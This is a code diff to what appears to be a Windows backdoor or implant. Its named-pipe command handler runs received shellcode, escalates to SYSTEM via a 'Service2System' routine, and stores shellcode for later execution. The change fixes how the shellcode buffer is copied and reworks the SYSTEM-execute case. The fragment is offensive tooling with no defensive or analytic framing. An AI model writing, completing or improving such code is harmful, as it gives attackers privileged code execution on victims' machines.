@@ -69,22 +69,19 @@ DWORD HandleCode(VOID) {
                 ReadFile(hPipe, szBuffer, BUFF_SIZE, &dwLen, NULL);
                 ExecuteShellCode(szBuffer, dwLen);
                 break;
-            case METHOD_GETSYSTEM:
+            case METHOD_GETSYSTEM: // system
                 ReadFile(hPipe, szBuffer, BUFF_SIZE, &dwLen, NULL);
                 Service2System();
                 break;
-            case METHOD_SYSTEM_EXECUTE:
-                ReadFile(hPipe, szBuffer, BUFF_SIZE, &dwLen, NULL);
-                ExecuteCommand(char2wchar(szBuffer));
+            case METHOD_SYSTEM_EXECUTE: // system-run
+                Execute();
                 break;
-            case METHOD_OPEN_SYSTEM_DOOR:
+            case METHOD_SET_SYSTEM_SHELLCODE: // system-code
+                ZeroMemory(szBuffer, BUFF_SIZE);
                 ReadFile(hPipe, szBuffer, BUFF_SIZE, &dwLen, NULL);
-                SystemCreateProcess(char2wchar(szBuffer));
-                break;
-            case METHOD_SET_SYSTEM_SHELLCODE:
-                ReadFile(hPipe, szBuffer, BUFF_SIZE, &dwLen, NULL);
+                g_ShellcodeBuffer = new char[dwLen];
+                RtlCopyMemory(g_ShellcodeBuffer, szBuffer, dwLen);
                 g_dwShellcodeSize = dwLen;
-                g_ShellcodeBuffer = szBuffer;
                 break;
             case METHOD_UNSET_SYSTEM_SHELLCODE:
                 g_dwShellcodeSize = 0;
